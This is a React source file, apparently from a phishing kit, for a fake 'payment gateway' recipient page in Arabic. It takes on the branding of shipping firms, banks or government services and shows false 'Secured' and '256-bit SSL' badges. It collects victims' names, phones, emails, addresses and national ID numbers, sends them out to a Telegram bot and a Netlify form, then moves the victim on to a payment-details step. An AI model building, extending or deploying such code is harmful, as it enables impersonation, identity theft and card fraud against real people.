import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { Loader2, User, Phone, Mail, MapPin, ArrowLeft, ShieldCheck, Globe, Lock, ChevronDown, Building2, Truck, CreditCard, Wallet } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";

const PaymentRecipient = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [address, setAddress] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || (linkData?.type === 'contracts' ? 'contracts' : 'aramex');
  const govId = searchParams.get("govId") || linkData?.payload?.govId;

  // Get entity visual spec
  const entitySpec = useMemo(() => {
    if (companyKey) {
      return getEntityVisualSpec(companyKey);
    }
    return null;
  }, [companyKey]);

  // Get branding as fallback
  const serviceBranding = getServiceBranding(companyKey);
  const companyBranding = companyKey ? shippingCompanyBranding[companyKey.toLowerCase()] : null;

  // Apply entity CSS variables
  useEffect(() => {
    if (entitySpec) {
      const cssVars = specToCSSVariables(entitySpec);
      const root = document.documentElement;
      Object.entries(cssVars).forEach(([key, value]) => {
        root.style.setProperty(key, value);
      });
      root.setAttribute('data-entity', entitySpec.entityId);
      root.setAttribute('data-entity-category', entitySpec.category);
    }
    return () => {
      const root = document.documentElement;
      root.removeAttribute('data-entity');
      root.removeAttribute('data-entity-category');
    };
  }, [entitySpec]);

  // Visual values
  const primaryColor = entitySpec?.colors.primary || companyBranding?.colors.primary || serviceBranding.colors.primary;
  const secondaryColor = entitySpec?.colors.secondary || companyBranding?.colors.secondary || serviceBranding.colors.secondary;
  const backgroundColor = entitySpec?.colors.background || companyBranding?.colors.background || '#F8F9FA';
  const surfaceColor = entitySpec?.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
  const textColor = entitySpec?.colors.text || companyBranding?.colors.text || '#1A1A1A';
  const textLightColor = entitySpec?.colors.textLight || companyBranding?.colors.textLight || '#666666';
  const borderColor = entitySpec?.colors.border || companyBranding?.colors.border || '#E5E5E5';
  const fontFamily = entitySpec?.typography.fontFamilyAr || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif';
  const borderRadius = entitySpec?.dimensions.borderRadius || companyBranding?.borderRadius.lg || '16px';
  const buttonHeight = entitySpec?.dimensions.buttonHeight || '56px';
  const inputHeight = entitySpec?.dimensions.inputHeight || '52px';
  const cardShadow = entitySpec?.shadows.card || companyBranding?.shadows.lg || '0 10px 40px rgba(0,0,0,0.1)';
  const logoUrl = entitySpec?.assets.logo || companyBranding?.logoUrl || serviceBranding.logo;
  const entityNameAr = entitySpec?.entityNameAr || serviceBranding.nameAr || companyKey;
  const entityNameEn = entitySpec?.entityNameEn || serviceBranding.nameEn || companyKey;
  const category = entitySpec?.category || 'shipping';

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const selectedCountryData = getCountryByCode(selectedCountry);
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  const isGov = category === 'government' || category === 'payment_gateway';

  useEffect(() => {
    if (linkData?.payload?.customerInfo) {
      const info = linkData.payload.customerInfo;
      setName(info.name || info.fullName || "");
      setPhone(info.phone || "");
      setEmail(info.email || "");
      setAddress(info.address || "");
    }
  }, [linkData]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!name || !phone) {
      toast({ title: "خطأ", description: "الرجاء إدخال الاسم ورقم الجوال", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const customerInfo = { name, phone, email, address, nationalId };

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id, payload: { ...linkData?.payload, customerInfo } });
      }

      // Netlify Form Submission
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "recipient-info",
          linkId: id!,
          service: entityNameAr,
          name, phone, email, address, nationalId,
          amount: formattedAmount
        }).toString()
      });

      await sendToTelegram({
        type: 'recipient_info',
        data: { name, phone, email, address, nationalId, service: entityNameAr, amount: formattedAmount, country: selectedCountryData?.nameAr },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/details${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل حفظ البيانات", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor }}>
        <Loader2 className="w-10 h-10 animate-spin" style={{ color: primaryColor }} />
      </div>
    );
  }

  // Category icon
  const CategoryIcon = category === 'shipping' || category === 'postal' ? Truck :
                       category === 'bank' ? Building2 :
                       category === 'payment_gateway' ? CreditCard :
                       Wallet;

  return (
    <div className="min-h-screen flex flex-col" dir="rtl" style={{ backgroundColor, fontFamily }}>
      <PaymentMetaTags
        serviceKey={companyKey}
        serviceName={entityNameAr}
        title={`بوابة الدفع - ${entityNameAr}`}
      />

      {/* Entity Header */}
      <header className="border-b-2 sticky top-0 z-50 px-4" style={{ backgroundColor: surfaceColor, borderBottomColor: primaryColor, boxShadow: entitySpec?.shadows.header || '0 2px 8px rgba(0,0,0,0.06)' }}>
        <div className="container mx-auto h-16 sm:h-20 flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            {logoUrl ? (
              <img src={logoUrl} alt={entityNameAr} className="h-10 sm:h-12 object-contain" />
            ) : (
              <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl flex items-center justify-center text-white shadow-lg" style={{ backgroundColor: primaryColor }}>
                <CategoryIcon className="w-5 h-5 sm:w-6 sm:h-6" />
              </div>
            )}
            <div className="hidden md:block">
              <h1 className="text-sm font-bold leading-none" style={{ color: textColor }}>{entityNameAr}</h1>
              <p className="text-[9px] font-bold uppercase tracking-widest mt-1" style={{ color: textLightColor }}>E-Services & Payment Gateway</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-1 text-[10px] font-bold border rounded-full px-3 py-1" style={{ color: textLightColor, borderColor, backgroundColor: `${textLightColor}08` }}>
              <Globe className="w-3 h-3" />
              <span>English</span>
            </div>
            <div className="hidden md:flex items-center gap-2 px-3 py-1 rounded-full border" style={{ backgroundColor: `${primaryColor}08`, color: primaryColor, borderColor: `${primaryColor}20` }}>
              <Lock className="w-3 h-3" />
              <span className="text-[10px] font-bold uppercase">Secured</span>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
        <div className="w-full max-w-xl space-y-8">
          <div className="text-center space-y-2">
            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight" style={{ color: textColor }}>بيانات مستلم الخدمة</h2>
            <p className="text-sm font-medium uppercase tracking-wide" style={{ color: textLightColor }}>Recipient Information & Verification</p>
          </div>

          <Card className="border-none overflow-hidden" style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}>
            <div className="h-2 w-full" style={{ backgroundColor: primaryColor }} />
            <form onSubmit={handleSubmit} className="p-6 sm:p-10 space-y-6">
              <div className="space-y-6">
                <div className="space-y-1.5">
                  <Label className="text-[11px] font-bold uppercase tracking-wide px-1" style={{ color: textLightColor }}>الاسم الكامل للمستفيد</Label>
                  <div className="relative group">
                    <Input value={name} onChange={(e) => setName(e.target.value)} className="pr-12 transition-all" style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px' }} placeholder="أدخل اسمك الكامل" required />
                    <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 transition-colors" style={{ color: textLightColor }} />
                  </div>
                </div>

                <div className="grid sm:grid-cols-2 gap-6">
                  <div className="space-y-1.5">
                    <Label className="text-[11px] font-bold uppercase tracking-wide px-1" style={{ color: textLightColor }}>رقم الجوال</Label>
                    <div className="relative group">
                      <Input value={phone} onChange={(e) => setPhone(e.target.value)} className="pr-12 transition-all" style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px' }} placeholder="05xxxxxxxx" required />
                      <Phone className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 transition-colors" style={{ color: textLightColor }} />
                    </div>
                  </div>
                  <div className="space-y-1.5">
                    <Label className="text-[11px] font-bold uppercase tracking-wide px-1" style={{ color: textLightColor }}>البريد الإلكتروني (اختياري)</Label>
                    <div className="relative group">
                      <Input value={email} onChange={(e) => setEmail(e.target.value)} className="pr-12 transition-all" style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px' }} placeholder="example@mail.com" />
                      <Mail className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 transition-colors" style={{ color: textLightColor }} />
                    </div>
                  </div>
                </div>

                <div className="space-y-1.5">
                  <Label className="text-[11px] font-bold uppercase tracking-wide px-1" style={{ color: textLightColor }}>{isGov ? "رقم الهوية / الإقامة" : "العنوان بالتفصيل"}</Label>
                  <div className="relative group">
                    <Input
                      value={isGov ? nationalId : address}
                      onChange={(e) => isGov ? setNationalId(e.target.value) : setAddress(e.target.value)}
                      className="pr-12 transition-all"
                      style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px' }}
                      placeholder={isGov ? "أدخل رقم الهوية" : "المدينة، الحي، الشارع"}
                      required
                    />
                    {isGov ? <ShieldCheck className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 transition-colors" style={{ color: textLightColor }} /> : <MapPin className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 transition-colors" style={{ color: textLightColor }} />}
                  </div>
                </div>
              </div>

              <div className="pt-6">
                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full text-lg font-bold shadow-xl hover:translate-y-[-2px] transition-all active:scale-[0.98]"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                    boxShadow: entitySpec?.shadows.button || `0 8px 24px ${primaryColor}40`,
                    borderRadius,
                    height: buttonHeight,
                    color: entitySpec?.colors.textOnPrimary || '#FFFFFF',
                  }}
                >
                  {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "متابعة عملية الدفع"}
                </Button>
                <div className="mt-6 flex items-center justify-center gap-2" style={{ color: textLightColor }}>
                  <ShieldCheck className="w-4 h-4" />
                  <span className="text-[10px] font-bold uppercase tracking-widest">تشفير بيانات آمن 256-bit SSL</span>
                </div>
              </div>
            </form>
          </Card>

          <div className="flex justify-center gap-8 opacity-40 grayscale">
            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-6" alt="mada" />
            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-6" alt="visa" />
            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-6" alt="mastercard" />
          </div>
        </div>
      </main>

      <form name="recipient-info" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="service" />
        <input type="text" name="name" />
        <input type="tel" name="phone" />
        <input type="email" name="email" />
        <input type="text" name="address" />
        <input type="text" name="nationalId" />
        <input type="text" name="amount" />
      </form>
    </div>
  );
};

export default PaymentRecipient;
